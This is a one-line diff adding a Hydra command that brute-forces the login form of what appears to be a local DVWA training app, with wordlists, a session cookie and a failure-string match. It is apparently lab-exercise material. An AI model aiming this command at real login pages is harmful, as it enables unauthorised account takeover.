@@ -1,0 +1,1 @@
+hydra 172.17.0.2 -L user.txt -P password.txt http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=v56h80ii6u2orq0rnvh0otkq731; security=low:F=Username and/or password incorrect."
